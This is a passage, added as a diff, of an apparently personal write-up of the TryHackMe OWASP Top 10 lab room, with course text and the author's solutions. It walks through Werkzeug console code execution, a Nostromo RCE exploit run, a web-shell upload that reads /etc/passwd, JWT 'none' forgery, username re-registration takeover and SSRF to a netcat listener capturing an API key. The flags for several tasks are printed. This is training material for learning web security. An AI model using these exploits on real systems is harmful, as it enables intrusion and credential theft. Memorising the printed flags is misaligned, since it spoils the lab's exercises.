@@ -531,3 +531,537 @@ drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 ..
 drwxr-xr-x    1 root     root        4.0K Sep  7  2022 bin
 drwxr-xr-x    5 root     root         340 Mar  9 17:45 dev
 drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 etc
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 home
+drwxr-xr-x    1 root     root        4.0K Sep  7  2022 lib
+drwxr-xr-x    5 root     root        4.0K Aug  9  2022 media
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 mnt
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 opt
+dr-xr-xr-x  202 root     root           0 Mar  9 17:45 proc
+drwx------    1 root     root        4.0K Sep  7  2022 root
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 run
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 sbin
+drwxr-xr-x    2 root     root        4.0K Aug  9  2022 srv
+dr-xr-xr-x   13 root     root           0 Mar  9 17:45 sys
+drwxrwxrwt    1 root     root        4.0K Mar  9 18:53 tmp
+drwxr-xr-x    1 root     root        4.0K Sep  7  2022 usr
+drwxr-xr-x    1 root     root        4.0K Sep  7  2022 var
+/tmp # env
+HOSTNAME=b78a5922443b
+PYTHON_PIP_VERSION=22.2.2
+SHLVL=2
+HOME=/root
+OLDPWD=/usr/src/app
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+WERKZEUG_SERVER_FD=3
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/5eaac1050023df1f5c98b173b248c260023f2278/public/get-pip.py
+WERKZEUG_RUN_MAIN=true
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.10.7
+PYTHON_SETUPTOOLS_VERSION=63.2.0
+WERKZEUG_DEBUG_PIN=off
+PWD=/tmp
+PYTHON_GET_PIP_SHA256=5aefe6ade911d997af080b315ebcb7f882212d070465df544e1175ac2be519b4
+
+/ # cat .dockerenv
+/ # cd /usr/src
+/usr/src # ls
+app
+/usr/src # cd app
+/usr/src/app # ls -lah
+total 40K    
+drwxr-xr-x    1 root     root        4.0K Mar  9 18:47 .
+drwxr-xr-x    1 root     root        4.0K Sep 15 04:21 ..
+-rw-r--r--    1 root     root         249 Sep 15 05:07 Dockerfile
+-rw-r--r--    1 root     root        1.4K Feb  3 04:28 app.py
+-rw-r--r--    1 root     root         137 Sep 15 05:05 requirements.txt
+drwxr-xr-x    2 root     root        4.0K Sep 15 05:06 templates
+-rw-r--r--    1 root     root        8.0K Mar  9 18:47 todo.db
+/usr/src/app # cat requirements.txt
+Click==7.0
+Flask==1.1.1
+Flask-SQLAlchemy==2.4.1
+itsdangerous==1.1.0
+Jinja2==2.10.3
+MarkupSafe==1.1.1
+SQLAlchemy==1.3.11
+Werkzeug==0.16.0
+/usr/src/app # cd Dockerfile
+sh: cd: can't cd to Dockerfile: Not a directory
+/usr/src/app # cat Dockerfile
+FROM python:3-alpine
+
+RUN mkdir -p /usr/src/app
+WORKDIR /usr/src/app
+
+COPY requirements.txt /usr/src/app/
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY . /usr/src/app
+
+EXPOSE 5000
+
+ENV WERKZEUG_DEBUG_PIN off
+
+CMD [ "python", "./app.py" ]
+```
+Navigate to [http://10.10.89.200:86/console](http://10.10.89.200:86/console) to access the Werkzeug console.
+Completed
+Use the Werkzeug console to run the following Python code to execute the `ls -l` command on the server:
+```python
+import os; print(os.popen("ls -l").read())
+```
+What is the database file name (the one with the .db extension) in the current directory?
+*todo.db*
+Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?
+### 6. Vulnerable and Outdated Components
+Vulnerable and Outdated Components
+Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.
+For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as [WPScan](https://wpscan.com/wordpress-security-scanner), you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on [Exploit-DB](https://www.exploit-db.com/exploits/41962).
+As you can see, this would be quite devastating because it requires very little work on the attacker's part. Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already. The situation worsens when you realise that it's really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.
+Answer the questions below
+Read about the vulnerability.
+Completed
+Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software and research it until we can find an exploit. Let's go through that with an example web application.
+_Nostromo 1.9.6_
+What do you know? This server has the default page for the Nostromo web server. Now that we have a version number and a software name, we can use [Exploit-DB](https://www.exploit-db.com/) to try and find an exploit for this particular version.
+Lucky us, the top result happens to be an exploit script. Let's download it and try to get code execution. Running this script on its own teaches us a very important lesson.
+Linux
+```shell-session
+user@linux$ python 47837.py
+Traceback (most recent call last):
+  File "47837.py", line 10, in <module>
+    cve2019_16278.py
+NameError: name 'cve2019_16278' is not defined
+```
+Exploits you download from the Internet may not work the first time. It helps to understand the programming language the script is in so that, if needed, you can fix any bugs or make any modifications, as quite a few scripts on Exploit-DB expect you to make modifications.
+Fortunately, the error was caused by a line that should have been commented out, so it's an easy fix.
+```python
+# Exploit Title: nostromo 1.9.6 - Remote Code Execution
+```
+```python
+# Date:
+```
+```python
+# Exploit Author: Kr0ff
+```
+```python
+# Vendor Homepage:
+```
+```python
+# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
+```
+```python
+# Version: 1.9.6
+```
+```python
+# Tested on: Debian
+```
+```python
+# CVE : CVE-2019-16278
+
+cve2019_16278.py  # This line needs to be commented.
+
+#!/usr/bin/env python
+```
+Fixing that, let's try and run the program again.
+Linux
+```shell-session
+user@linux$ python2 47837.py 127.0.0.1 80 id
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \
+   _____\    \_\      |  |      | /    / |    |
+  /     /|     ||     /  /     /|/    /  /___/|
+ /     / /____/||\    \  \    |/|    |__ |___|/
+|     | |____|/ \ \    \ |    | |       \
+|     |  _____   \|     \|    | |     __/ __
+|\     \|\    \   |\         /| |\    \  /  \
+| \_____\|    |   | \_______/ | | \____\/    |
+| |     /____/|    \ |     | /  | |    |____/|
+ \|_____|    ||     \|_____|/    \|____|   | |
+        |____|/                        |___|/
+
+HTTP/1.1 200 OK
+Date: Fri, 03 Feb 2023 04:58:34 GMT
+Server: nostromo 1.9.6
+Connection: close
+
+uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
+```
+Boom! We have RCE. Now it's important to note that most scripts will tell you what arguments you need to provide. Exploit developers will rarely make you read potentially hundreds of lines of code just to figure out how to use the script.
+It is also worth noting that it may not always be this easy. Sometimes you will just be given a version number, like in this case, but other times you may need to dig through the HTML source or even take a lucky guess on an exploit script. But realistically, if it is a known vulnerability, there's probably a way to discover what version the application is running.
+That's really it. The great thing about this piece of the OWASP Top 10 is that the work is already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit.
+Answer the questions below
+Read the above!
+Completed
+### Vulnerable and Outdated Components - Lab
+Navigate to [http://10.10.89.200:84](http://10.10.89.200:84/) where you'll find a vulnerable application. All the information you need to exploit it can be found online.
+Answer the questions below
+```text
+You know it's a bookstore application. You should check for recent unauthenticated bookstore apps RCEs.
+
+https://www.exploit-db.com/exploits/47887
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 47887.py http://10.10.89.200:84 
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.89.200:84/bootstrap/img/XHkm9Gmx4J.php
+> Example command usage: http://10.10.89.200:84/bootstrap/img/XHkm9Gmx4J.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ cat /opt/flag.txt
+THM{But_1ts_n0t_my_f4ult!}
+
+RCE $ cat /etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+apache:x:100:101:apache:/var/www:/sbin/nologin
+mysql:x:101:102:mysql:/var/lib/mysql:/sbin/nologin
+
+RCE $ cat /etc/shadow
+
+RCE $ ls -lah /
+total 116K   
+drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 .
+drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 ..
+-rwxr-xr-x    1 root     root           0 Feb  3 05:09 .dockerenv
+drwxr-xr-x    2 root     root        4.0K May 23  2022 bin
+drwx------    7 mysql    root        4.0K Mar  9 17:45 data
+drwxr-xr-x    5 root     root         340 Mar  9 17:45 dev
+-rwxr-xr-x    1 root     root        2.2K May 12  2022 docker-entrypoint.sh
+drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 etc
+drwxr-xr-x    2 root     root        4.0K May 23  2022 home
+drwxr-xr-x    1 root     root        4.0K Sep 13 06:17 htdocs
+drwxr-xr-x    1 root     root        4.0K Sep 12 22:59 lib
+drwxr-xr-x    5 root     root        4.0K May 23  2022 media
+drwxr-xr-x    2 root     root        4.0K May 23  2022 mnt
+drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 opt
+dr-xr-xr-x  209 root     root           0 Mar  9 17:45 proc
+drwx------    1 root     root        4.0K Feb  3 05:09 root
+drwxr-xr-x    1 root     root        4.0K Feb  3 05:09 run
+drwxr-xr-x    1 root     root        4.0K Sep 12 22:59 sbin
+drwxr-xr-x    2 root     root        4.0K May 23  2022 srv
+-rwxr-xr-x    1 root     root        2.1K Sep 13 06:10 start.sh
+dr-xr-xr-x   13 root     root           0 Mar  9 17:45 sys
+drwxrwxrwt    1 root     root       20.0K Mar  9 19:10 tmp
+drwxr-xr-x    1 root     root        4.0K May 23  2022 usr
+drwxr-xr-x    1 root     root        4.0K Jul 16  2022 var
+```
+What is the content of the /opt/flag.txt file?
+### 7. Identification and Authentication Failures
+Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users' browser with a session cookie if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of users' actions.
+If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users' accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include the following:
+-   **Brute force attacks:** If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
+-   **Use of weak credentials:** Web applications should set strong password policies. If applications allow users to set passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts.
+-   **Weak Session Cookies:** Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users' accounts.
+There can be various mitigation for broken authentication mechanisms depending on the exact flaw:
+-   To avoid password-guessing attacks, ensure the application enforces a strong password policy.
+-   To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.
+-   Implement Multi-Factor Authentication. If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.
+Answer the questions below
+I've understood broken authentication mechanisms.
+Completed
+### Identification and Authentication Failures Practical
+For this example, we'll look at a logic flaw within the authentication mechanism.
+Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.
+Let's understand this with the help of an example, say there is an existing user with the name `admin`, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user `admin`.
+To see this in action, go to [http://10.10.89.200:8088](http://10.10.89.200:8088/) and try to register with `darren` as your username. You'll see that the user already exists, so try to register " darren" instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.
+Answer the questions below
+```text
+Error: This user is already registered
+
+ darren
+
+User registered successfully!
+
+fe86079416a21a3c99937fea8874b667
+
+ arthur
+
+User registered successfully!
+
+d9ac0f7db4fda460ac3edeb75d75e16e
+```
+What is the flag that you found in darren's account?
+*fe86079416a21a3c99937fea8874b667*
+Now try to do the same trick and see if you can log in as arthur.
+Completed
+What is the flag that you found in arthur's account?
+*d9ac0f7db4fda460ac3edeb75d75e16e*
+### 8. Software and Data Integrity Failures
+What is Integrity?
+When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?
+To overcome this problem, you will often see a **hash** sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.
+Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their [Sourceforge repository](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/), you'll see that for each file available to download, there are some hashes published along:
+These hashes were precalculated by the creators of WinSCP so that you can check the file's integrity after downloading. If we download the `WinSCP-5.21.5-Setup.exe` file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:
+AttackBox
+```shell-session
+user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
+20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
+                                                                                                                
+user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
+c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
+                                                                                                                
+user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
+e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
+```
+Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.
+Software and Data Integrity Failures
+This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. There are mainly two types of vulnerabilities in this category:
+-   Software Integrity Failures
+-   Data Integrity Failures
+Answer the questions below
+Read the above and continue!
+Completed
+### Software Integrity Failures
+Software Integrity Failures
+Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+```
+When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.
+The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it [here](https://www.srihash.org/).
+The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+```
+You can go to [https://www.srihash.org/](https://www.srihash.org/) to generate hashes for any library if needed.
+Answer the questions below
+```text
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+```
+What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?
+Remember you can use https://www.srihash.org/ to calculate integrity hashes for SRI.
+*sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=*
+### Data Integrity Failures
+﻿Data Integrity Failures
+Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. **Cookies** are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.
+For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.
+One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is **JSON Web Tokens (JWT)**.
+JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:
+The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.
+Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use [this online tool](https://appdevtools.com/base64-encoder-decoder) to encode/decode base64. Try decoding the header and payload of the following token:
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`
+**Note:** The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.
+JWT and the None Algorithm
+A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
+1.  Modify the header section of the token so that the `alg` header would contain the value `none`.
+2.  Remove the signature part.
+Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
+It sounds pretty simple! Let's walk through the process an attacker would have to follow in an example scenario. Navigate to [http://10.10.89.200:8089/](http://10.10.89.200:8089/) and follow the instructions in the questions below.
+Answer the questions below
+```text
+Invalid Credentials. You can also login as "guest" with password "guest"
+
+Hello guest. Only the admin user is allowed to get the flag!
+
+jwt token
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjc4Mzk1NjgyfQ.D-nvz3nrJg3Ftj4p8MKC1RYLLUzLuaImUrV7gsvB0rw
+
+https://jwt.io/
+
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+
+{
+  "username": "guest",
+  "exp": 1678395682
+}
+
+changing to alg: none and username: admin
+
+{"typ":"JWT","alg":"none"}
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.
+
+{"username":"admin","exp":1678395682}
+
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4Mzk1NjgyfQ.
+
+so final will be
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4Mzk1NjgyfQ.
+
+THM{Dont_take_cookies_from_strangers}
+```
+Try logging into the application as guest. What is guest's account password?
+Try logging in with the wrong credentials.
+*guest*
+If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.
+Depending on your browser, you will be able to edit cookies from the following tabs:
+**Firefox**
+**Chrome**
+What is the name of the website's cookie containing a JWT token?
+*jwt-session*
+Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".
+Completed
+What is the flag presented to the admin user?
+### 9. Security Logging and Monitoring Failures
+Download Task Files
+When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:
+-   **Regulatory damage:** if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+-   **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+The information stored in logs should include the following:
+-   HTTP status codes
+-   Time Stamps
+-   Usernames
+-   API endpoints/page locations
+-   IP addresses
+These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.
+As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:
+-   Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
+-   Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
+-   Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
+-   Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
+Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.
+Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the `Download Task Files` button at the top of the task.
+Answer the questions below
+```text
+200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
+200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
+200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
+200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
+200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
+200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
+401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
+401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
+401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
+401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
+```
+What IP address is the attacker using?
+Check for common actions in a short sequence of time.
+*49.99.13.16*
+What kind of attack is being carried out?
+What do you call trying combinations of usernames and passwords to gain access to users' accounts?
+*brute force*
+### 10. Server-Side Request Forgery (SSRF)
+Server-Side Request Forgery
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:
+By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:
+`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
+This would make the vulnerable web application make a request to:
+`https://attacker.thm/api/send?msg=ABC`
+You could then just capture the contents of the request using Netcat:
+AttackBox
+```shell-session
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+```
+This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
+-   Enumerate internal networks, including IP addresses and ports.
+-   Abuse trust relationships between servers and gain access to otherwise restricted services.
+-   Interact with some non-HTTP services to get remote code execution (RCE).
+Let's quickly look at how we can use SSRF to abuse some trust relationships.
+Practical Example
+```text
+http://10.10.89.200:8087/admin
+
+Admin interface only available from localhost!!!
+
+ <a href="/download?server=secure-file-storage.com:8087&id=75482342" class="w3-button w3-light-grey w3-padding-large w3-margin-top">
+      <i class="fa fa-download"></i> Download Resume
+    </a>
+
+http://10.10.89.200:8087/download?server=secure-file-storage.com:8087&id=75482342
+
+10.10.89.200:8087/download?server=10.8.19.103:8087&id=75482342
+
+──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 8087
+listening on [any] 8087 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.89.200] 45774
+GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
+Host: 10.8.19.103:8087
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+X-API-KEY: THM{Hello_Im_just_an_API_key}
+```
+Navigate to [http://10.10.89.200:8087/](http://10.10.89.200:8087/), where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!
+Answer the questions below
+Explore the website. What is the only host allowed to access the admin area?
+Try to access the admin area. Can you find any useful info in the error messages?
+*localhost*
+Check the "Download Resume" button. Where does the server parameter point to?
+*secure-file-storage.com*
+Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?
+**Going the Extra Mile:** There's a way to use SSRF to gain access to the site's admin area. Can you find it?
+**Note:** You won't need this flag to progress in the room. You are expected to do some research in order to achieve your goal.
+Completed
+### What Next?
+﻿What Next?
+Why not enrol in our [beginner-level pathway](https://tryhackme.com/path/outline/beginner) or [find another room](https://tryhackme.com/hacktivities) to complete?
+Answer the questions below
+Read the above!
+Complete
+
+## Flags / Answers
+- ![OWASP logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/585aef878659bfbed7d6150703c6ba9d.png)
+- ![Access Controls](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3804b69c1b754f353733fac2ccd71d31.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0ddb5676eebdb367bff750717268b82b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/42a83d8c119295a79dfcab36b7e4d105.png)
+- ***flag{fivefourthree}***
+- ![Crackstation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ce8684674027b9a6fb6d5755d53074.png)
+- ![Cracked Password](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6c4321e296cbf60e4f53417dd7a9146c.png)
+- ***THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}***
+- ![Command Injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8c2e8030730682f9eb1304fa1d81d47a.png)
+- ![Inline commands](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b7158502a9799698ec0ab29a850c8840.png)
